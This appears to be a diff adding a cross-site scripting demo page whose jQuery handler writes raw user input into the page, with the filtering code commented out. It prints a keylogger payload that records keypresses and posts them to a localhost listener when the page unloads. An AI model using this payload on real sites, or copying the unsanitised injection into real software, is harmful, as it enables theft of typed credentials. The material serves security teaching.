@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Cross Site Scripting (XSS)</title>
+
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    </head>
+    <body>
+        <br><br></br></br>
+        <div class="card col-sm-12 col-md-4 col-lg-4" style = "margin: auto;">
+            <div class="card-body">
+                <br>
+                <h3>Cross Site Scripting (XSS)</h3>
+                <div class="form-group">
+                    <!-- <input id = "xss-code" type="text" name="" value=""> -->
+                    <label for="defaultUsername"> Enter Credientials</label>
+                    <input id = "xss-code" type="text" class="form-control" id="defaultUsername" name="defaultUsername" placeholder="credientials">
+                </div>
+                <button class = "btn btn-success btn-sm btn-block" type='submit'>Submit</button>
+                <div id = "attack"></div>
+            </div>
+        </div>
+    <pre style = "margin-left: 450px;">
+
+
+Server Side:
+- Run the node server: $ node app.js
+
+
+Client Side:
+- Copy code below
+- Paste into input box above
+- Click submit
+- Open console
+- Start typing random words
+- You should see your letters displayed
+
+------------------------------------------
+    <i>
+&lt;link rel="icon" href="data:,">
+
+&lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js">&lt;/script>
+
+&lt;script>
+
+    var phrase = [];
+
+    $(document).on('keypress',function(key){
+        var letter = String.fromCharCode(key.charCode);
+        phrase.push(letter);
+    });
+
+    window.onbeforeunload = function () {
+        $.post('http://localhost:5000/' + phrase.toString());
+    };
+
+
+&lt;/script>
+</i>
+        </pre>
+
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+        <script type="text/javascript">
+
+            //var pattern = /<(.*)>/;
+
+            //function hasHtmlTags(string) {
+            //    return pattern.test(string);
+            //};
+
+
+            $("button").on('click', function(){
+                $('#attack').html($('#xss-code').val())
+                //if (hasHtmlTags($('#xss-code').val())) {
+                //   alert("Prevention from XSS")
+                //}
+                //else {
+                //    $('#attack').html($('#xss-code').val())
+                //}
+            })
+
+
+        </script>
+    </body>
+</html>
